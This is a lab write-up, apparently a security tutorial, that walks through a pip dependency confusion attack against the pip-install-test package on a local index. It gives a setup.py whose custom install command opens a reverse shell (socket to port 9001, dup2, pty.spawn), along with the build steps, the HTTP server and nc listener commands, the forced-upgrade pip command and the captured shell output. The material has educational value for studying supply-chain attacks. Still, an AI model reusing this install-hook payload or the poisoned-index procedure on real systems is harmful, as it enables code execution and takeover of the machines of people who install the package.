# PIP dependency confusion
## Theory
![conf](confusion.png)

https://medium.com/@alex.birsan/dependency-confusion-4a5d60fec610
## Lab setup
- Debian GNU/Linux 12 (bookworm) x64
- Python 3.11.2 
- Python virtualenv
- pip 23.0.1

## POC
We are going to use [pip-install-test package](https://pypi.org/project/pip-install-test), the current version is 0.5.
First of all activate a virtual enviroment:

    python3 -m venv dep-conf
    source dep-conf/bin/activate
    (dep-conf) user@xxxxx:~$ 

Proceed to install the test package:

     pip install pip-install-test -vv
     ...
     Successfully installed pip-install-test-0.5

To perform our attack we must set a local pip repo. This is a very easy task: https://packaging.python.org/en/latest/guides/hosting-your-own-index
Here I'm going just to create the required folder structure, then I will use Python built-in web server to host the malicious package. My root web folder structure is the following:

    piprepo.local/
    └── pip-install-test
        └── pip-install-test-0.6.tar.gz

You can download the package from this repo and serve it directly using your web server, but for the sake of learning we are going to recreate the package from scratch. Once you have decompressed the archive you will have the following directory structure:

        pip-install-test-0.6/
        ├── pip_install_test
        │   └── __init__.py
        ├── pip_install_test.egg-info
        │   ├── dependency_links.txt
        │   ├── not-zip-safe
        │   ├── PKG-INFO
        │   ├── SOURCES.txt
        │   └── top_level.txt
        ├── PKG-INFO
        ├── README.rst
        ├── setup.cfg
        └── setup.py

We can delete some stuff that actually we don't need to recreate the package:

        cd pip-install-test-0.6/
        rm -r setup.cfg pip_install_test.egg-info

Now our package source folder structure should be:

        pip-install-test-0.6/
        ├── pip_install_test
        │   └── __init__.py
        ├── PKG-INFO
        ├── README.rst
        └── setup.py

We are interested in abuse the set-up procedure, so our payload has to be inserted into setup.py:

       ...
            
        class PostInstallCmd(install):
            def run(self):
                install.run(self)
                print ("Hello, I'm going to confuse U...")
                s=socket.socket()
                s.connect(("127.0.0.1",9001))
                [os.dup2(s.fileno(),f)for f in(0,1,2)]; pty.spawn("sh")
        
        setup(name='pip-install-test',
              version='0.6',
              description='A minimal stub package to test success of pip install',
              long_description=long_description,
              author='Simon Krughoff',
              author_email='krughoff@lsst.org',
              license='MIT',
              packages=['pip_install_test'],
              zip_safe=False,
              cmdclass={
                    'install': PostInstallCmd
                }
              )
The interesting part is the cmdclass attribuite object, that will execute the actual apyload, that of course is a reverse shell to localhost, in this case.

## Perform the attack
First create the package (you know that to confuse pip we have to serve a more recent version, here I just incremented to 0.6). From inside the root package source directory execute:

    pip-install-test-0.6$ python3 setup.py sdist
    ...
    creating dist
    Creating tar archive
    removing 'pip-install-test-0.6' (and everything under it)

You will find the created archive inside the dist folder:

    pip-install-test-0.6$ ls dist
        pip-install-test-0.6.tar.gz

Now we have to move the package inside the web root folder, taking care to respect the required structure for the local pip repository:

    mv dist/pip-install-test-0.6.tar.gz /home/user/piprepo.local/pip-install-test

Then you should have the following structure:

    cd /home/user/piprepo.local/
    ~/piprepo.local$ tree
    .
    └── pip-install-test
        └── pip-install-test-0.6.tar.gz

From here we will execute our web server:

    ~/piprepo.local$ python3 -m http.server
    Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...

Now we have to trick pip to get our malicious package, we can just update pip-install-test, saying to pip to look in our local repo for the new version. Before that start a nc listener:

     nc -lvp 9001
    listening on [any] 9001 ...

Then from the virtual enviroment proceed to update the package:

    (dep-conf) user@xxxxx:~$  pip3 install pip-install-test --trusted-host <your_hostname> --index-url http://<your_hostname>:8000 -vv -U
    ...
    Looking up "http://xxxxx:8000/pip-install-test/pip-install-test-0.6.tar.gz" in the cache
    No cache entry available
    ...
    http://xxxxx:8000 "GET /pip-install-test/pip-install-test-0.6.tar.gz HTTP/1.1" 200 1702
    ...
    Attempting uninstall: pip-install-test
    Found existing installation: pip-install-test 0.5
    Uninstalling pip-install-test-0.5:
    ...
    Copying pip_install_test.egg-info to /home/user/dep-conf/lib/python3.11/site-packages/pip_install_test-0.6.egg-info
      running install_scripts
      writing list of installed files to '/tmp/pip-record-8vjjx4uj/install-record.txt'
      Hello, I'm going to confuse U...

Then we shoul get a shell:

    ...
    connect to [127.0.0.1] from localhost [127.0.0.1] 37186
    (dep-conf) \[\e]0;\u@\h: \w\a\]\[\033[01;32m\]\u@\h\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]$ id
    id
    uid=1000(user) gid=1000(user) groups=1000(user),995(qubes)
    (dep-conf) \[\e]0;\u@\h: \w\a\]\[\033[01;32m\]\u@\h\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]$ 



    
    
        
        

  
    
